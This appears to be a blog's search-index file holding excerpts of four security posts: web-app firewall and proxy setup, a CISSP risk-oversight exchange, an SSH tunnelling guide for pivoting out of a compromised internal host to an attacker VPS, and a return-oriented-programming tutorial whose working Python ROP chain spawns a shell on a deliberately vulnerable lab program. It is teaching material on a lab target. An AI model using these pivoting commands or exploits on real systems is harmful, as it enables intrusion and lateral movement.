var store = [{
        "title": "Ideas on Scaling up Security Architecture for Deploying Web Apps",
        "excerpt":"Let us take a case of a mid sized company which wants to scale up its security architecture for it’s client facing website. As per the terms of reference, there should be minimum disruption in the existing workflow and any kind of code rewrite is not on the platter. They have a classic deployment in which the website is hosted on Virtual Private Servers (VPSs).      We can have a two pronged strategy here, first to minimize the attack surface and then to monitor the traffic that is allowed to come in. This can be done by limiting access to hosted infrastructure (VPS) by dropping all the traffic at ingress except that for https or port 443. We also need to limit the access to web APIs in such a way that, the internal APIs are not exposed to outside world and all incoming traffic on the exposed public APIs is being monitored.    Now, having worked out the design goals, we can rework the architecture of our deployment. Of course there are many ways to go about the security architecture, but one of the ways is to enable/introduce following artifacts.      Infrastructure Firewall   Proxy / Load balancer   Web Application Firewall      Infrastructure Firewall  The infrastructure firewall will drop all traffic at ingress of our VPS except that meant for https and http. We can also configure the firewall to limit the traffic from specific IPs/subnets. Some of the sample rules in our firewalld of CentOS7 as given here:   Firewalld Rules  # Step 1: Create a trusted Zone having whitelisted IP / subnet. firewall-cmd --permanent --add-source=10.10.10.10 --zone=trusted &amp;  # Step 2: Add service http and https to the trusted zone firewall-cmd --permanent --add-service=http --zone=trusted &amp; firewall-cmd --permanent --add-service=https --zone=trusted &amp;  # Step 3: Remove service http and https from the public zone firewall-cmd --permanent --remove-service=http --zone=public &amp; firewall-cmd --permanent --remove-service=https --zone=public &amp; firewall-cmd --reload   Proxy / Load balancer  The proxy will ensure that our website is not directly exposed to the outside world and has additional benefits of load balancing. We can setup Access Control Lists (ACLs) so that only specific endpoints of our website APIs are accessible from outside. This will also safeguard any accidental exposure of our internal APIs. Some of the sample configuration settings for the HAproxy could be as follows:   HAProxy Config Rules  frontend httpsandhttp         bind *:80         bind *:443 ssl crt /etc/ssl/haproxy.pem         # Redirect traffic to https                 http-request redirect scheme https unless { ssl_fc }         mode http         acl app1 path_end -i /app1         acl app2 path_end -i /app2    \t     \tuse_backend app1Servers if app1      \tuse_backend app2Servers if app2  backend app1Servers         balance roundrobin                 mode http         server webserver1 127.0.0.1:2222 check weight 1 maxconn 50 ssl verify none          backend app2Servers         balance roundrobin                 mode http         server webserver2 127.0.0.1:3333 check weight 1 maxconn 50 ssl verify none  Web Application Firewall  The traffic from our proxy now goes through the Web Application Firewall. This is configured to thwart common web application vulnerabilities. We could use the open source WAF like modsecurity or vendor dependent one. The WAFs also have the settings to configure it as proxy for sending the actual website traffic. Thus both proxy and WAF can be bundled in one software. We can run everything in a containerised environment using docker or Kubernetes.   Reference     https://www.youtube.com/watch?v=qYnA2DFEELw   https://www.haproxy.com/blog/redirect-http-to-https-with-haproxy/   ","categories": ["Web Architecture"],
        "tags": ["WAF","Firewall","HAProxy","Proxy","Load balancer"],
        "url": "/musings/web%20architecture/web-apps/",
        "teaser": null
      },{
        "title": "Conversations with Luke Ahmed in path towards CISSP",
        "excerpt":"This article was originally published on LinkedIn   The path towards CISSP is a meandering one. There are conflicting choices, which one to choose, when both seem to be appropriate. What we choose largely depends upon our world view formed by our experiences. I was going through this question in Luke Ahmed’s book How To Think Like A Manager on risk oversight vs risk-based decisions. Well it got me thinking and I shot a scenario at Luke to seek his point of view on risk oversight vs risk-based decisions.   Scenario poised at Luke   Rymar Tech is a products company and has a policy in which the username of its subscribers is not sensitive information. It can be known and shared with anyone. Now, during the vulnerability assessment process, it has come to the fore that their systems are susceptible to brute forcing of usernames. It requires a security upgrade and entails spending of thousands of dollars to fix the problem. In the pandemic times the company revenues are affected. The company is at the risk of losing its reputation as all the usernames may be made public or sold on darknet. Now the management has to decide. This decision making will come under which head : risk oversight or risk-based decisions?   Luke’s Response   The difference between the board and management is that management is responsible for the actions that are involved in risk management.   The board does not make any decisions for the company when it comes to narrow risk-based decisions, that is left up to the company’s management. The board is there to make sure management has a risk management program, that is the oversight. The job of the board of directors is to hold management accountable, but not to make the actual decisions in the organization, that’s what separates the board from management.   Remember that what is happening in the context of the question is an actual risk assessment. A risk assessment gathers important information about the information systems of the organization. After the assessment occurs a risk analysis. The results of the risk analysis are then sent to management for approval, to make risk-based decisions. In our CISSP books, risk-based decisions are approved by management.   So with this, risk oversight belongs with the board (the ones who make sure management is doing their job).   Making risk-based decisions that directly affect the company belongs with management, the question asks for the primary reason for “management’s” new initiative.   In the back of the book you will see a list of sources used for each question. In the realm of oversight, I used this source for this question to distinguish between the responsibilities of the board and management.   In it, it states “The board has the task of overseeing management’s implementation of strategic and operational risk management”.   Note : This conversation has been published after seeking permission from Luke Ahmed. However, author is solely responsible for any technical errors due to oversight.  ","categories": [],
        "tags": [],
        "url": "/musings/luke-1/",
        "teaser": null
      },{
        "title": "Understanding SSH Tunnelling and Proxychains",
        "excerpt":"Having a good knowledge on SSH tunnelling is an important tool in the arsenal for pentesting engagements and for playing networked Capture The Flag (CTF) events.   Problem Statement  We have gained an initial foothold on one of the internal system of an organization. Now, we want to run nmap scans on the internal networks to pivot laterally. The organization is also running an internally hosted website which is not accessible from outside. How do we expose the internal ports/traffic to the outside attacker machine so that we can run our tools and gain access to resources which are not exposed to the outside world?   Cyber Range Setup  The setup of the cyber range is given in figure below:      Actions at Victim Machine  Step 1:  As we already have an initial foothold on the victim machine, we will start the socate.exe. This program will forward the traffic to its local port:  socate.exe TCP-LISTEN:8080,fork,reuseaddr TCP:&lt;target-server-ip&gt;:443  Once the traffic has been forwarded to a specific port, in our case 8080, we can verify the same through netstat command:  # Now check if the port has been forwarded netstat -ano // check connection  Step 3:  We will redirect the traffic of the victim PC to the Virtual Private Server (VPS) through SSH tunnel, using plink.exe for windows.  # Connect with VPS plink.exe -l &lt;username&gt; -pw &lt;password&gt; -R 8080:127.0.0.1:8080 &lt;vps ip&gt;   Actions at VPS Machine  # To check with curl /etc/hosts 127.0.0.1 &lt;domain-name&gt;  Forward Traffic to Kali Machine from VPS  # On Kali Machine ssh -g -L 8080:localhost:8080 -f -N &lt;username&gt;@&lt;vps ip&gt; // this use when want to open localhost  Now open the browser and enter  http://&lt;domain-name&gt;:8080   Configure SOCKS5 proxy  Actions at victim machine  plink.exe -l &lt;username&gt; -pw &lt;password&gt; -D 8080:127.0.0.1:8080 &lt;vps ip&gt;  Actions at VPS  Install proxychains  $ yum install proxychains $ nano /etc/proxychain.conf socks5 &lt;vps-public-ip&gt; 8080  Check on terminal  $ proxychains curl www.myweb.com  On Kali Machine  Do settings in the browser, if we want to open websites in browser   In case you want to use terminal for traffic and not browser, perform following steps  $ yum install proxychains  # nano /etc/proxychain.conf socks5 &lt;vps-public-ip&gt; 8080  Check on terminal  $ proxychains curl www.myweb.com   Reference     https://pswalia2u.medium.com/ssh-tunneling-port-forwarding-pivoting-socks-proxy-85fb7129912d  ","categories": [],
        "tags": [],
        "url": "/musings/ssh-tunnel/",
        "teaser": null
      },{
        "title": "Wading through the maze of ROP chains",
        "excerpt":"Birds Eye View and the Deep Dive Series   Birds Eye View     The main idea of Return Oriented Programming (ROP) is to chain and run the instructions which are already present in the code to the attackers advantage.    Getting to know Buffer Overflows   In buffer overflow vulnerabilities one of the most common methods used by the attacker was to write the shellcode onto the stack and then to execute this shellcode. The execution of the shellcode was achieved by controlling the EIP, and pointing it to the start of the shellcode. The buffer overflow attacks have targeted both stack and heap memory regions for exploiting these vulnerabilities.      The key to successful buffer overflow attack is to control the Instruction Pointer (IP).    In order to mitigate the effect of the buffer overflow vulnerabilities we have following mitigations in place:      Stack Canaries: This is a compiler level protection. These are inserted by the compilers at compile time into the binaries. Different compilers have different ways by which they accomplish it.   Data Execution Prevention (DEP): This is supported at the hardware level by way of NX bit. Setting or unsetting this bit will make the address space executable or non-executable. We can control it through software.   Address Space Layout Randomization (ASLR): Here we randomize the address space of various segments of the program, so that they don’t have fixed address which can be easily exploited by the malicious actors. ASLR can be enabled or disable at the operation system level. In linux we have additional features to control it at program level also.   Where do the ROPs fit in?  In Return Oriented Programming (ROP) we chain the gadgets in such a way that we are able to obtain the shell (command prompt) on the vulnerable system. It is primarily used to bypass the DEP safeguards.   And what do you mean by gadgets?  Well, these are a group of instructions which end with ret. Some of the useful ROP gadgets are:      Loading constant into register pop eax; ret   Loading from memory mov ebx, [eax]; ret   Store in memory mov [eax], ebx; ret   Arithmetic operations xor eax, eax; ret   System calls int 0x80; ret   Deep Dive  Having the background lets try to take a deep dive and understand what the hullabaloo is about.   Our objective is to launch /bin/sh shell   We will make use of following steps:     Write /bin/sh string in memory   Setup execve syscall number   Setup execve arguments   Syscall gadgets   Find syscall interrupt   Build the ROP chain as a python script   Building the ROP Chain     int execve(const char *filename, char *const argv[], char *const envp[]);            pop ebx - first argument       pop ecx - second argument       pop edx - third argument           xor eax, eax            used to initialize the context to zero           inc eax            used 11 times to setup the execve syscall number           int 0x80            syscall exception           Example Exploitation  Let’s take a vulnerable buffer overflow example code:  /*rop.c*/ #include &lt;stdio.h&gt; #include &lt;string.h&gt; int main(int argc,char *argv[]){ \tchar buf[10]; \tstrcpy(buf,argv[1]); \tprintf(\"Buf:%s\\n\",buf); \treturn 0; }  Compiling the above program  $ gcc -ggdb -m32 -mpreferred-stack-boundary=2 -fno-stack-protector -znoexecstack rop.c -o rop     -m32: For output in 32 bit binary format.   ggdb: Enable debug info.   mpreferred-stack-boundary: GCC will align stack pointer on 2^2=4byte boundary.   fno-stack-protector: To disable stack canaries.   znoexecstack: Enable NX to make stack non executable   Disable ASLR  ASLR has following flags options     0:  No Randomization   1: Conservative Randomization            Shared libraries       Stack       Mmap       VDSO       Heap           2 Full Randomization            Brk()           For ease of understanding let us switch off the ASLR:  $ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space  Check the security attributes of binary using gdb-peda  $ gdb-peda -q ./rop Reading symbols from ./rop...done.  gdb-peda$ checksec CANARY    : disabled FORTIFY   : disabled NX        : ENABLED PIE       : ENABLED RELRO     : FULL  Find the offset to EIP  Now, let’s find the offset to the EIP in this program using pattern_create and pattern_offset commands:  gdb-peda$ pattern_create 50 patt.txt gdb-peda$ r $(cat patt.txt) Stopped reason: SIGSEGV 0x2d414143 in ?? () gdb-peda$ pattern_offset 0x2d414143 759251267 found at offset: 18  Find gadgets and build the ROP chain  We have to find the required gadgets from the libc library used by our program. In order to find the libc version, load the program in gdb-peda and put a breakpoint at main():  gdb-peda$ b main  Run the program and use vmmap to see the modules loaded by the program   gdb-peda$ vmmap Start      End        Perm\tName 0x56555000 0x56556000 r-xp\t/home/cdac/prac-examples/rop 0x56556000 0x56557000 r--p\t/home/cdac/prac-examples/rop 0x56557000 0x56558000 rw-p\t/home/cdac/prac-examples/rop 0xf7ddd000 0xf7fb2000 r-xp\t/lib/i386-linux-gnu/libc-2.27.so 0xf7fb2000 0xf7fb3000 ---p\t/lib/i386-linux-gnu/libc-2.27.so 0xf7fb3000 0xf7fb5000 r--p\t/lib/i386-linux-gnu/libc-2.27.so 0xf7fb5000 0xf7fb6000 rw-p\t/lib/i386-linux-gnu/libc-2.27.so 0xf7fb6000 0xf7fb9000 rw-p\tmapped 0xf7fcf000 0xf7fd1000 rw-p\tmapped ...  Here, we can see the version of libc that is getting loaded at runtime. /lib/i386-linux-gnu/libc-2.27.so is getting loaded at the base address of 0xf7ddd000. We will now use the following command to search for gadgets and create a chain using ROPGadget tool  $ ROPgadget --ropchain --binary /lib/i386-linux-gnu/libc-2.27.so &gt; ./gadgets.txt  The gadgets found will be saved in gadgets.txt file. At the end of the file we can see that a python2 code will be generated for ROP chain to call /bin/sh. Let us have a peep inside this file  Unique gadgets found: 118662  ROP chain generation =========================================================== - Step 5 -- Build the ROP chain  \t#!/usr/bin/env python2 \t# execve generated by ROPgadget  \tfrom struct import pack  \t# Padding goes here \tp = ''   The addresses inside the ROP chain will be offsets inside the libc.so library. We have to add the base address that we have noted earlier. After adding the base address and the offset for the EIP, the python script will look as follows:  #!/usr/bin/env python2 # execve generated by ROPgadget  from struct import pack  # Offset to EIP p = 'A'*18 # Add the base address of the libc.so library base = 0xf7ddd000  # Put the address of .data section will be moved into edx register p += pack('&lt;I', base + 0x00001aae) # pop edx ; ret p += pack('&lt;I', base + 0x001d8040) # @ .data  # Address of '/bin' string into eax register p += pack('&lt;I', base + 0x00024c1e) # pop eax ; ret p += '/bin'  # Mov '/bin' string to start of .data section p += pack('&lt;I', base + 0x00075655) # mov dword ptr [edx], eax ; ret  # Mov '//sh' string to .data+4 section p += pack('&lt;I', base + 0x00001aae) # pop edx ; ret p += pack('&lt;I', base + 0x001d8044) # @ .data + 4 p += pack('&lt;I', base + 0x00024c1e) # pop eax ; ret p += '//sh' p += pack('&lt;I', base + 0x00075655) # mov dword ptr [edx], eax ; ret  # Now, we have to give two more arguments to the execve() function, which can be null p += pack('&lt;I', base + 0x00001aae) # pop edx ; ret p += pack('&lt;I', base + 0x001d8048) # @ .data + 8 p += pack('&lt;I', base + 0x0002e565) # xor eax, eax ; ret p += pack('&lt;I', base + 0x00075655) # mov dword ptr [edx], eax ; ret  # First argument has to be in ebx p += pack('&lt;I', base + 0x00018c85) # pop ebx ; ret p += pack('&lt;I', base + 0x001d8040) # @ .data  # Second argument in ecx register which is null p += pack('&lt;I', base + 0x001926d5) # pop ecx ; ret p += pack('&lt;I', base + 0x001d8048) # @ .data + 8  # Third argument in edx register which is null p += pack('&lt;I', base + 0x00001aae) # pop edx ; ret p += pack('&lt;I', base + 0x001d8048) # @ .data + 8  # Now, we have to place 11 in eax which is number of execve() system call p += pack('&lt;I', base + 0x0002e565) # xor eax, eax ; ret p += pack('&lt;I', base + 0x00024bf8) # inc eax ; ret p += pack('&lt;I', base + 0x00024bf8) # inc eax ; ret p += pack('&lt;I', base + 0x00024bf8) # inc eax ; ret p += pack('&lt;I', base + 0x00024bf8) # inc eax ; ret p += pack('&lt;I', base + 0x00024bf8) # inc eax ; ret p += pack('&lt;I', base + 0x00024bf8) # inc eax ; ret p += pack('&lt;I', base + 0x00024bf8) # inc eax ; ret p += pack('&lt;I', base + 0x00024bf8) # inc eax ; ret p += pack('&lt;I', base + 0x00024bf8) # inc eax ; ret p += pack('&lt;I', base + 0x00024bf8) # inc eax ; ret p += pack('&lt;I', base + 0x00024bf8) # inc eax ; ret  # Syscall exception p += pack('&lt;I', base + 0x00002d37) # int 0x80  print p  To this code we have added the offset to EIP offset which is 18 bytes and also the base address of libc library. Here the pack library is used to automatically reverse the address as per little endian format requirements.   $ ./rop $(python rop-exploit.py) Buf:AAAAAAAAAAAAAAAAAA����@P��\u001e\u001c�� $ whoami secure $ id uid=1000(secure) gid=1000(secure) groups=1000(secure)  Voila!! we have successfully executed the /bin/sh using ROP chain.  ","categories": ["Buffer Overflow","ROP Chain"],
        "tags": ["ROP Chains","DEP","Stack Canaries","Return Oriented Programming","gdb","Buffer Overflow"],
        "url": "/musings/buffer%20overflow/rop%20chain/rop-chains/",
        "teaser": null
      }]
